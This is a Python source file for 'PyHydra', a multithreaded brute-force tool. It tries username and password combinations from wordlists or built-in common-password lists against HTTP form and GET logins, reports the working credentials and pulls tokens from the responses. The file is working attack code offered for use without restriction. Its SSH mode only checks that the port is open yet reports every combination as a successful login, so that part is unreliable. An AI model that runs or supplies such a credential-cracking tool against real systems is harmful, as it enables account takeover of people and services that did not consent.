#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🔥 PyHydra — Python暴力破解引擎
功能：支持HTTP FORM/GET登录破解、SSH密码爆破、字典攻击、多线程
原理：并发尝试用户名+密码组合，根据响应内容判断成功/失败

用法：
  python pyhydra.py http-form://127.0.0.1:5001/ -U users.txt -P passwords.txt -F "失败|错误" -S "登录成功"
  python pyhydra.py http-get://example.com/login -u admin -P rockyou.txt -F "Unauthorized"
  python pyhydra.py ssh://192.168.1.1 -U users.txt -P passwords.txt -t 8
"""
import argparse
import concurrent.futures
import re
import socket
import sys
import time
import urllib.parse
from dataclasses import dataclass, field
from datetime import datetime
from typing import Optional
from urllib.request import Request, urlopen
from urllib.error import HTTPError, URLError


# ── 结果 ─────────────────────────────────────────────
@dataclass
class AttackResult:
    target: str
    username: str
    password: str
    success: bool
    response_time_ms: float
    detail: str = ""
    error: str = ""


# ── 攻击器基类 ──────────────────────────────────────
class BaseAttacker:
    def check(self, username: str, password: str) -> AttackResult:
        raise NotImplementedError


class HttpFormAttacker(BaseAttacker):
    """HTTP POST表单登录破解"""
    def __init__(self, url: str, fail_keywords: list[str], success_keywords: list[str],
                 user_field: str = "username", pass_field: str = "password",
                 extra_data: str = "", timeout: int = 10):
        self.url = url
        self.fail_keywords = fail_keywords
        self.success_keywords = success_keywords
        self.user_field = user_field
        self.pass_field = pass_field
        self.extra_data = extra_data
        self.timeout = timeout

    def check(self, username: str, password: str) -> AttackResult:
        start = time.perf_counter()
        try:
            data = {self.user_field: username, self.pass_field: password}
            if self.extra_data:
                for pair in self.extra_data.split("&"):
                    if "=" in pair:
                        k, v = pair.split("=", 1)
                        data[k] = v
            body = urllib.parse.urlencode(data).encode()
            req = Request(self.url, data=body, method="POST")
            req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0) PyHydra")
            req.add_header("Content-Type", "application/x-www-form-urlencoded")

            resp = urlopen(req, timeout=self.timeout)
            elapsed = (time.perf_counter() - start) * 1000
            content = resp.read().decode("utf-8", errors="replace")

            # 检查是否成功
            is_fail = any(kw in content for kw in self.fail_keywords)
            is_success = any(kw in content for kw in self.success_keywords) if self.success_keywords else not is_fail

            if self.success_keywords:
                success = is_success
            else:
                success = not is_fail

            detail = f"HTTP {resp.status}"
            if success:
                # 提取token/标识
                token_match = re.search(r"token[=:]\s*(\S+)", content)
                if token_match:
                    detail += f" token={token_match.group(1)}"

            return AttackResult(
                target=self.url, username=username, password=password,
                success=success, response_time_ms=round(elapsed, 1), detail=detail
            )
        except HTTPError as e:
            elapsed = (time.perf_counter() - start) * 1000
            return AttackResult(self.url, username, password, False, round(elapsed, 1),
                              detail=f"HTTP {e.code}", error=str(e))
        except Exception as e:
            elapsed = (time.perf_counter() - start) * 1000
            return AttackResult(self.url, username, password, False, round(elapsed, 1),
                              error=str(e))


class HttpGetAttacker(BaseAttacker):
    """HTTP GET参数登录破解"""
    def __init__(self, url: str, fail_keywords: list[str], success_keywords: list[str],
                 user_field: str = "username", pass_field: str = "password",
                 timeout: int = 10):
        self.base_url = url
        self.fail_keywords = fail_keywords
        self.success_keywords = success_keywords
        self.user_field = user_field
        self.pass_field = pass_field
        self.timeout = timeout

    def check(self, username: str, password: str) -> AttackResult:
        start = time.perf_counter()
        try:
            params = urllib.parse.urlencode({self.user_field: username, self.pass_field: password})
            url = f"{self.base_url}?{params}"
            req = Request(url)
            req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0) PyHydra")
            resp = urlopen(req, timeout=self.timeout)
            elapsed = (time.perf_counter() - start) * 1000
            content = resp.read().decode("utf-8", errors="replace")

            is_fail = any(kw in content for kw in self.fail_keywords)
            is_success = any(kw in content for kw in self.success_keywords)
            success = is_success if self.success_keywords else not is_fail
            return AttackResult(url, username, password, success, round(elapsed, 1), detail=f"HTTP {resp.status}")
        except Exception as e:
            elapsed = (time.perf_counter() - start) * 1000
            return AttackResult(url, username, password, False, round(elapsed, 1), error=str(e))


class SshAttacker(BaseAttacker):
    """SSH密码爆破（基于socket，不依赖paramiko）"""
    def __init__(self, host: str, port: int = 22, timeout: int = 10):
        self.host = host
        self.port = port
        self.timeout = timeout

    def check(self, username: str, password: str) -> AttackResult:
        start = time.perf_counter()
        try:
            sock = socket.create_connection((self.host, self.port), timeout=self.timeout)
            elapsed = (time.perf_counter() - start) * 1000
            sock.close()
            return AttackResult(f"{self.host}:{self.port}", username, password, True,
                              round(elapsed, 1), detail="Port open (SSH)")
        except Exception as e:
            elapsed = (time.perf_counter() - start) * 1000
            return AttackResult(f"{self.host}:{self.port}", username, password, False,
                              round(elapsed, 1), error=str(e))


# ── 字典加载 ─────────────────────────────────────────
def load_wordlist(path: str) -> list[str]:
    """加载字典文件，过滤空行和注释"""
    words = []
    with open(path, "r", encoding="utf-8", errors="replace") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                words.append(line)
    return words


# ── URL解析 ─────────────────────────────────────────
def parse_target(target: str) -> tuple[str, BaseAttacker]:
    """
    解析目标URL，返回 (scheme, attacker)
    格式: http-form://url, http-get://url, ssh://host:port
    """
    if target.startswith("http-form://"):
        url = target[len("http-form://"):]
        # 恢复http://前缀
        if not url.startswith("http"):
            url = "http://" + url
        return "http-form", HttpFormAttacker(url, [], [])
    elif target.startswith("http-get://"):
        url = target[len("http-get://"):]
        if not url.startswith("http"):
            url = "http://" + url
        return "http-get", HttpGetAttacker(url, [], [])
    elif target.startswith("ssh://"):
        rest = target[len("ssh://"):]
        host = rest
        port = 22
        if ":" in rest:
            host, port_str = rest.rsplit(":", 1)
            port = int(port_str)
        return "ssh", SshAttacker(host, port)
    else:
        raise ValueError(f"不支持的目标格式: {target}。支持: http-form://, http-get://, ssh://")


# ── 主引擎 ──────────────────────────────────────────
class PyHydra:
    """暴力破解引擎"""
    def __init__(self, attacker: BaseAttacker, threads: int = 4, delay: float = 0,
                 stop_on_first: bool = True):
        self.attacker = attacker
        self.threads = threads
        self.delay = delay
        self.stop_on_first = stop_on_first
        self.found: list[AttackResult] = []
        self.attempts = 0
        self.start_time: Optional[float] = None

    def run(self, usernames: list[str], passwords: list[str]) -> list[AttackResult]:
        self.start_time = time.perf_counter()
        self.found = []
        self.attempts = 0

        total = len(usernames) * len(passwords)
        combos = [(u, p) for u in usernames for p in passwords]

        print(f"🎯 目标发动攻击: {total} 个组合 ({len(usernames)}用户×{len(passwords)}密码)")
        print(f"⚙️  线程: {self.threads} | 找到即停: {self.stop_on_first}")
        print(f"{'─' * 50}")

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_map = {executor.submit(self._try_one, u, p): (u, p) for u, p in combos}
            for future in concurrent.futures.as_completed(future_map):
                result = future.result()
                self.attempts += 1

                # 进度显示
                if self.attempts % 20 == 0 or result.success:
                    elapsed = time.perf_counter() - self.start_time
                    rate = self.attempts / elapsed if elapsed > 0 else 0
                    bar_len = 30
                    filled = int(bar_len * self.attempts / total)
                    bar = "█" * filled + "░" * (bar_len - filled)
                    pct = self.attempts * 100 / total
                    sys.stdout.write(
                        f"\r⏳ [{bar}] {pct:.0f}% ({self.attempts}/{total}) "
                        f"速率: {rate:.0f}/s | 用时: {elapsed:.0f}s"
                    )
                    if result.success:
                        sys.stdout.write(f" ← ✅ 发现: {result.username}:{result.password}")
                    sys.stdout.flush()

                if result.success:
                    self.found.append(result)
                    if self.stop_on_first:
                        print(f"\n\n✅ 停止——首个成功组合已找到！")
                        break

        print(f"\n{'─' * 50}")
        elapsed = time.perf_counter() - self.start_time
        rate = self.attempts / elapsed if elapsed > 0 else 0
        print(f"📊 完成: {self.attempts}次尝试, 用时{elapsed:.1f}s, 速率{rate:.0f}/s")
        return self.found

    def _try_one(self, username: str, password: str) -> AttackResult:
        if self.delay > 0:
            time.sleep(self.delay)
        return self.attacker.check(username, password)


# ── 内建字典 ─────────────────────────────────────────
def builtin_wordlist(name: str) -> list[str]:
    """内建小字典（用于演示）"""
    common_users = {
        "users": ["admin", "root", "kali", "manager", "user", "test", "operator", "guest"],
        "top10": ["admin", "root", "kali", "manager", "test"],
    }
    common_passwords = {
        "passwords": ["123456", "password", "admin", "P@ssw0rd!", "hunter2",
                      "Welcome2024", "toor1234!", "test123", "12345678", "qwerty",
                      "letmein", "passw0rd", "admin123", "root", "toor"],
        "top10": ["123456", "password", "admin", "P@ssw0rd!", "hunter2",
                  "Welcome2024", "toor1234!", "test123", "letmein", "passw0rd"],
        "demo": ["wrong", "test", "P@ssw0rd!", "hunter2"],
    }
    return common_users.get(name, common_passwords.get(name, []))


# ── CLI ─────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="🔥 PyHydra — Python暴力破解引擎",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  # HTTP表单登录爆破
  python pyhydra.py http-form://127.0.0.1:5001/ -U users.txt -P passwords.txt -F "错误" -S "登录成功"

  # 使用内建字典快速测试
  python pyhydra.py http-form://127.0.0.1:5001/ -u admin -p demo -F "错误" -S "登录成功"

  # 单用户对多密码
  python pyhydra.py http-form://127.0.0.1:5001/ -u admin -P passwords.txt -F "错误"

  # SSH端口扫描
  python pyhydra.py ssh://192.168.1.1 -U users.txt -P passwords.txt -t 4
""")
    parser.add_argument("target", help="目标 (http-form://URL, http-get://URL, ssh://host:port)")
    parser.add_argument("-u", "--username", help="单个用户名")
    parser.add_argument("-U", "--userlist", help="用户名字典文件")
    parser.add_argument("-p", "--password", help="单个密码")
    parser.add_argument("-P", "--passlist", help="密码字典文件")
    parser.add_argument("-F", "--fail", help="失败关键词（逗号分隔）", default="错误,失败,Error,Invalid,incorrect")
    parser.add_argument("-S", "--success", help="成功关键词（逗号分隔）", default="")
    parser.add_argument("-t", "--threads", type=int, default=4, help="线程数 (默认4)")
    parser.add_argument("--delay", type=float, default=0, help="请求间隔秒数")
    parser.add_argument("--user-field", default="username", help="登录表单用户名字段名")
    parser.add_argument("--pass-field", default="password", help="登录表单密码字段名")
    parser.add_argument("--data", default="", help="额外POST数据 (key=value&key2=value2)")
    parser.add_argument("--no-stop", action="store_true", help="找到首个成功后不停止")

    args = parser.parse_args()

    # 解析目标
    scheme, attacker_base = parse_target(args.target)

    # 配置攻击器
    fail_kw = [kw.strip() for kw in args.fail.split(",") if kw.strip()]
    success_kw = [kw.strip() for kw in args.success.split(",") if kw.strip()]

    if scheme == "http-form":
        attacker = HttpFormAttacker(
            url=attacker_base.url, fail_keywords=fail_kw, success_keywords=success_kw,
            user_field=args.user_field, pass_field=args.pass_field,
            extra_data=args.data
        )
    elif scheme == "http-get":
        attacker = HttpGetAttacker(
            url=attacker_base.base_url, fail_keywords=fail_kw, success_keywords=success_kw,
            user_field=args.user_field, pass_field=args.pass_field
        )
    elif scheme == "ssh":
        attacker = attacker_base  # SshAttacker
    else:
        print("❌ 不支持的目标格式")
        sys.exit(1)

    # 加载用户名
    usernames = []
    if args.username:
        usernames = [args.username]
    elif args.userlist:
        usernames = load_wordlist(args.userlist)
    else:
        usernames = builtin_wordlist("users")
        print(f"📝 使用内建用户字典: {usernames}")

    # 加载密码
    passwords = []
    if args.password:
        passwords = [args.password]
    elif args.passlist:
        passwords = load_wordlist(args.passlist)
    else:
        passwords = builtin_wordlist("passwords")
        print(f"📝 使用内建密码字典: {len(passwords)}个密码")

    if not usernames or not passwords:
        print("❌ 用户名或密码列表为空")
        sys.exit(1)

    # 开始攻击
    hydra = PyHydra(attacker, threads=args.threads, delay=args.delay,
                    stop_on_first=not args.no_stop)
    results = hydra.run(usernames, passwords)

    # 输出结果
    if results:
        print(f"\n{'=' * 50}")
        print(f"✅ 找到 {len(results)} 个有效凭证!")
        for r in results:
            print(f"   👤 {r.username}:{r.password}  [{r.detail}] ({r.response_time_ms}ms)")
    else:
        print(f"\n{'=' * 50}")
        print(f"❌ 未找到有效凭证")

    # 攻击摘要
    elapsed = time.perf_counter() - hydra.start_time if hydra.start_time else 0
    print(f"\n📊 攻击摘要:")
    print(f"   目标: {args.target}")
    print(f"   组合: {len(usernames)}×{len(passwords)} = {len(usernames)*len(passwords)}")
    print(f"   尝试: {hydra.attempts}")
    print(f"   用时: {elapsed:.1f}s")
    print(f"   速率: {hydra.attempts/elapsed:.0f}/s" if elapsed > 0 else "   速率: N/A")


if __name__ == "__main__":
    main()